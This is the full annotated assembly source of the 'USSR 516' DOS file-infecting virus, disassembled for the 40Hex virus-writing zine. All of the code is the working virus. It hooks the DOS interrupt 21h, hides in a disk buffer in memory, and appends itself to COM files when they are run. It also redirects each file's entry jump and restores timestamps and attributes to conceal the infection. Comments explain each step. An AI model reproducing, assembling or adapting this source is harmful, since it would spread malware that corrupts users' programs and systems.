
ussr516         segment byte public
                assume  cs:ussr516, ds:ussr516
                org     100h
; Disassembled by Dark Angel of PHALCON/SKISM
; for 40Hex Number 7 Volume 2 Issue 3
stub:           db      0e9h, 0, 0
                db      0e9h, 1, 0, 0
; This is where the virus really begins
start:
                push    ax
                call    beginvir

orig4           db      0cdh, 20h, 0, 0
int30store      db      0, 0, 0, 0                     ; Actually it's int 21h
                                                       ; entry point
int21store      db      0, 0, 0, 0

beginvir:       pop     bp                             ; BP -> orig4
                mov     si,bp
                mov     di,103h
                add     di,[di-2]                      ; DI -> orig4
                movsw                                  ; restore original
                movsw                                  ; 4 bytes of program
                xor     si,si
                mov     ds,si
                les     di,dword ptr ds:[21h*4]
                mov     [bp+8],di                      ; int21store
                mov     [bp+0Ah],es
                lds     di,dword ptr ds:[30h*4+1]      ; Bug????
findmarker:
                inc     di
                cmp     word ptr [di-2],0E18Ah         ; Find marker bytes
                jne     findmarker                     ; to the entry point
                mov     [bp+4],di                      ; and move to
                mov     [bp+6],ds                      ; int30store
                mov     ax,5252h                       ; Get list of lists
                int     21h                            ; and also ID check

                add     bx,12h                         ; Already installed?
                jz      quitvir                        ; then exit
                push    bx
                mov     ah,30h                         ; Get DOS version
                int     21h

                pop     bx                             ; bx = 12, ptr to 1st
                                                       ; disk buffer
                cmp     al,3
                je      handlebuffer                   ; if DOS 3
                ja      handleDBHCH                    ; if > DOS 3
                inc     bx                             ; DOS 2.X, offset is 13
handlebuffer:
                push    ds
                push    bx
                lds     bx,dword ptr [bx]              ; Get seg:off of buffer
                inc     si
                pop     di
                pop     es                             ; ES:DI->seg:off buff
                mov     ax,[bx]                        ; ptr to next buffer
                cmp     ax,0FFFFh                      ; least recently used?
                jne     handlebuffer                   ; if not, go find it
                cmp     si,3
                jbe     quitvir
                stosw
                stosw
                jmp     short movetobuffer
handleDBHCH:   ; Disk Buffer Hash Chain Head array
                lds     si,dword ptr [bx]              ; ptr to disk buffer
                lodsw                                  ; info
                lodsw                                  ; seg of disk buffer
                                                       ; hash chain head array
                inc     ax                             ; second entry
                mov     ds,ax
                xor     bx,bx
                mov     si,bx
                lodsw                                  ; EMS page, -1 if not
                                                       ; in EMS
                xchg    ax,di                          ; save in di
                lodsw                                  ; ptr to least recently
                                                       ; used buffer
                mov     [di+2],ax                      ; change disk buffer
                                                       ; backward offset to
                                                       ; least recently used
                xchg    ax,di                          ; restore EMS page
                mov     [di],ax                        ; set to least recently
movetobuffer:                                          ; used
                mov     di,bx
                push    ds
                pop     es                             ; ES:DI -> disk buffer
                push    cs
                pop     ds
                mov     cx,108h
                lea     si,[bp-4]                      ; Copy from start
                rep     movsw
                mov     ds,cx                          ; DS -> interrupt table
                mov     word ptr ds:[4*21h],0BCh       ; New interrupt handler
                mov     word ptr ds:[4*21h+2],es       ; at int21
quitvir:
                push    cs                             ; CS = DS = ES
                pop     es
                push    es
                pop     ds
                pop     ax
                mov     bx,ax
                mov     si, 100h                       ; set up stack for
                push    si                             ; the return to the
                retn                                   ; original program
int24:
                mov     al,3                           ; Ignore all errors
                iret
tickstore       db      3                              ; Why???
buffer          db      3, 0, 9, 0

int21:
                pushf
                cli                                    ; CP/M style call entry
                call    dword ptr cs:[int30store-start]
                retn                                   ; point of int 21h

int21DSDX:                                             ; For int 21h calls
                push    ds                             ; with
                lds     dx,dword ptr [bp+2]            ; DS:DX -> filename
                call    int21
                pop     ds
                retn

                cmp     ax,4B00h                       ; Execute
                je      Execute
                cmp     ax,5252h                       ; ID check
                je      CheckID
                cmp     ah,30h                         ; DOS Version
                je      DosVersion
callorig21:                                            ; Do other calls
                jmp     dword ptr cs:[int21store-start]
DosVersion:    ; Why?????                             ; DOS Version
                dec     byte ptr cs:[tickstore-start]
                jnz     callorig21                     ; Continue if not 0
                push    es
                xor     ax,ax
                push    ax
                mov     es,ax
                mov     al,es:[46Ch]                   ; 40h:6Ch = Timer ticks
                                                       ; since midnight
                and     al,7                           ; MOD 15
                inc     ax
                inc     ax
                mov     cs:[tickstore-start],al        ; # 2-17
                pop     ax
                pop     es
                iret
CheckID:                                               ; ID Check
                mov     bx,0FFEEh                      ; FFEEh = -12h
                iret
Execute:                                               ; Execute
                push    ax                             ; Save registers
                push    cx
                push    es
                push    bx
                push    ds                             ; DS:DX -> filename
                push    dx                             ; save it on stack
                push    bp
                mov     bp,sp                          ; Set up stack frame
                sub     sp,0Ah                         ; Temporary variables
                                                       ; [bp-A] = attributes
                                                       ; [bp-8] = int 24 off
                                                       ; [bp-6] = int 24 seg
                                                       ; [bp-4] = file time
                                                       ; [bp-2] = file date
                sti
                push    cs
                pop     ds
                mov     ax,3301h                       ; Turn off ^C check
                xor     dl,dl                          ; (never turn it back
                call    int21                          ;  on.  Bug???)
                mov     ax,3524h                       ; Get int 24h
                call    int21                          ; (Critical error)
                mov     [bp-8],bx
                mov     [bp-6],es
                mov     dx,int24-start
                mov     ax,2524h                       ; Set to new one
                call    int21
                mov     ax,4300h                       ; Get attributes
                call    int21DSDX
                jnc     continue
doneinfect:
                mov     ax,2524h                       ; Restore crit error
                lds     dx,dword ptr [bp-8]            ; handler
                call    int21
                cli
                mov     sp,bp
                pop     bp
                pop     dx
                pop     ds
                pop     bx
                pop     es
                pop     cx
                pop     ax
                jmp     short callorig21               ; Call orig handler
continue:
                mov     [bp-0Ah],cx                    ; Save attributes
                test    cl,1                           ; Check if r/o????
                jz      noclearattr
                xor     cx,cx
                mov     ax,4301h                       ; Clear attributes
                call    int21DSDX                      ; Filename in DS:DX
                jc      doneinfect                     ; Quit on error
noclearattr:
                mov     ax,3D02h                       ; Open read/write
                call    int21DSDX                      ; Filename in DS:DX
                jc      doneinfect                     ; Exit if error
                mov     bx,ax
                mov     ax,5700h                       ; Save time/date
                call    int21
                mov     [bp-4],cx
                mov     [bp-2],dx
                mov     dx,buffer-start
                mov     cx,4
                mov     ah,3Fh                         ; Read 4 bytes to
                call    int21                          ; buffer
                jc      quitinf
                cmp     byte ptr ds:[buffer-start],0E9h; Must start with 0E9h
                jne     quitinf                        ; Otherwise, quit
                mov     dx,word ptr ds:[buffer+1-start]; dx = jmploc
                dec     dx
                xor     cx,cx
                mov     ax,4201h                       ; go there
                call    int21
                mov     ds:[buffer-start],ax           ; new location offset
                mov     dx,orig4-start
                mov     cx,4
                mov     ah,3Fh                         ; Read 4 bytes there
                call    int21
                mov     dx,ds:[orig4-start]
                cmp     dl,0E9h                        ; 0E9h means we might
                jne     infect                         ; already be there
                mov     ax,ds:[orig4+2-start]          ; continue checking
                add     al,dh                          ; to see if we really
                sub     al,ah                          ; are there.
                jz      quitinf
infect:
                xor     cx,cx
                mov     dx,cx
                mov     ax,4202h                       ; Go to EOF
                call    int21
                mov     ds:[buffer+2-start],ax         ; save filesize
                mov     cx,204h
                mov     ah,40h                         ; Write virus
                call    int21
                jc      quitinf                        ; Exit if error
                sub     cx,ax
                jnz     quitinf
                mov     dx,ds:[buffer-start]
                mov     ax,ds:[buffer+2-start]
                sub     ax,dx
                sub     ax,3                           ; AX->jmp offset
                mov     word ptr ds:[buffer+1-start],ax; Set up buffer
                mov     byte ptr ds:[buffer-start],0E9h; code the jmp
                add     al,ah
                mov     byte ptr ds:[buffer+3-start],al
                mov     ax,4200h                       ; Rewind to jmploc
                call    int21
                mov     dx, buffer-start
                mov     cx,4                           ; Write in the jmp
                mov     ah,40h
                call    int21
quitinf:
                mov     cx,[bp-4]
                mov     dx,[bp-2]
                mov     ax,5701h                       ; Restore date/time
                call    int21
                mov     ah,3Eh                         ; Close file
                call    int21
                mov     cx,[bp-0Ah]                    ; Restore attributes
                mov     ax,4301h
                call    int21DSDX
                jmp     doneinfect                     ; Return
ussr516         ends
                end     stub
